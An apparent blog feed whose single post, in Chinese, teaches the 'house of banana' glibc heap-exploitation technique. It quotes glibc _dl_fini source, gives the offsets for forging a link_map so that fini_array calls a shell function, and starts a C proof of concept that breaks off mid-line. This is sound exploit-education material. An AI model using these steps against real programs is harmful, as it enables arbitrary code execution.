<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2022-03-07T14:55:25.911Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>house of banana</title>
    <link href="https://cv196082.gitee.io/2022/03/07/house-of-banana/"/>
    <id>https://cv196082.gitee.io/2022/03/07/house-of-banana/</id>
    <published>2022-03-07T14:34:36.000Z</published>
    <updated>2022-03-07T14:55:25.911Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的被篡改的话也就没法利用了，而house of banana把攻击层面转向了ld</p></blockquote><p>首先，在main执行之后会执行__libc_csu_fini所以我们首先了解这个函数</p><h2 id="如何执行fini-array中的函数"><a href="#如何执行fini-array中的函数" class="headerlink" title="如何执行fini-array中的函数"></a>如何执行fini-array中的函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment"> auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">     copy the pointers in.  */</span></span><br><span class="line">  struct link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">     the main namespace.  */</span></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">     lock.  */</span></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">     the front.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><p>可以看到最后调用了array[i]()，不过我们需要控制array的话就需要进一步知道这是什么。</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到下面的其实是和这一部分有关的</p><p>其中的GL就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>下面就是_rtld_global这个结构体，但是这个结构体相对比较复杂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> hashval;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="keyword">size_t</span> size;</span><br><span class="line">      <span class="keyword">size_t</span> n_elements;</span><br><span class="line">      <span class="keyword">void</span> (*<span class="built_in">free</span>) (<span class="keyword">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><p>通过上面的for循环可以看到其实我们利用的也只是其中的dl_ns部分，所以下面的我就省略了。然后其中又是另一个结构体这里就不继续深挖了。</p><p>这里根据上面的内容可以看出来的是 <code>array = (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY\]-&gt;d_un.d_ptr);</code></p><p>再根据上面的for循环最后使用的是<code>l=l-&gt;next</code>可以看出来其实这是一个存在链表操作的结构，所以我们只需要伪造链表当中的其中一个结构体就行。</p><p>再次看到这个赋值操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">    &#123;</span><br><span class="line">        assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">        maps[i] = l;</span><br><span class="line">        l-&gt;l_idx = i;</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">        ++l-&gt;l_direct_opencount;</span><br><span class="line">    &#125;</span><br><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>这里的maps需要的是4个元素，所以我们劫持第三个l-&gt;next到我们伪造的结构当中即可，并且可以绕过下面两个assert</p><p><img src="/images/image-20220307134013740.png" alt="image-20220307134013740"></p><p>所以我们利用distance求出偏移然后修改掉&amp;_rtld_global-0x1e048的地址到我们伪造的结构体就行，另外在这一代码当中存在一个if判断，需要绕过这一if判断</p><p><img src="/images/image-20220307134759927.png" alt="image-20220307134759927"></p><p><img src="/images/image-20220307134820512.png" alt="image-20220307134820512"></p><p>所以我们只需要在fake+0x28=fake就可</p><p>现在的目标就是进行伪造，能够顺利的执行到最后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">    l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">        || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">                              &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">            _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                              DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">                              ns);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">                (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                              / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                ((<span class="keyword">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在的是三个if判断</p><p><img src="/images/image-20220307135557831.png" alt="image-20220307135557831"></p><p>首先是l_init_called可以看到他们之间的距离为0x314然后地址上的值为0x1c，所以只需要fake+0x314=0x1c即可绕过。(在glibc2.31当中的距离为0x31c，上面没注意使用的是glibc2.27下面改用2.31)</p><p>随后就是下面两个if语句，fake-&gt;l_info[26]和fake-&gt;l_info[28]!=NULL即可绕过，然后可以看到下面这两个其实直接控制了，array和i的值，所以我们需要利用好这两个。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DT_FINI_ARRAY26<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>DT_FINI_ARRAYSZ28<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20220307171529724.png" alt="image-20220307171529724"></p><p><img src="/images/image-20220307171150261.png" alt="image-20220307171150261"></p><p>查看info的结构体，这里的伪造方式我直接引用我参考的博客来写</p><p>在fake+0x110处写入fake+0x40，然后在fake+0x48写入fake+0x58然后在fake+0x58写入shell</p><p>在fake+0x120出写入fake+0x48，在fake+0x50处写入8</p><h3 id="总结利用方式"><a href="#总结利用方式" class="headerlink" title="总结利用方式"></a>总结利用方式</h3><p>首先劫持结构体：</p><p>​    <code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code></p><p>绕过检测：</p><p>​    <code>fake+0x28 = fake</code></p><p>​    <code>fake+0x31c = 0x1c</code></p><p>控制array：</p><p>​    <code>fake+0x110 = fake+0x40</code></p><p>​    <code>fake+0x48 = fake+0x58</code></p><p>​    <code>fake+0x58 = shell</code></p><p>控制i：</p><p>​    <code>fake+0x120 = fake+0x48</code></p><p>​    <code>fake+0x50 = 8</code></p><p><strong>需要注意的</strong></p><p>上面说的maps需要四个元素，然后我懒得调试就没在glibc2.31下调试，所以就直接写poc但是存在问题，后面调试发现其实需要的是7个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br></pre></td></tr></table></figure><p>所以如果是在glibc2.31下我们劫持结构体的方式应该变为：</p><p>​    <code>&amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next) = fake</code></p><p>后续的内容一致</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>下面是我自己写的poc，我将large bin attack的步骤省略了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> *target;</span><br><span class="line">    <span class="keyword">uint64_t</span> *fake;</span><br><span class="line">    <span class="keyword">uint64_t</span> main_arena_96;</span><br><span class="line">    <span class="keyword">uint64_t</span> *rtld_global_addr;</span><br><span class="line"></span><br><span class="line">    fake = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(fake);</span><br><span class="line">    main_arena_96 = *(<span class="keyword">uint64_t</span> *)fake;</span><br><span class="line">    rtld_global_addr = 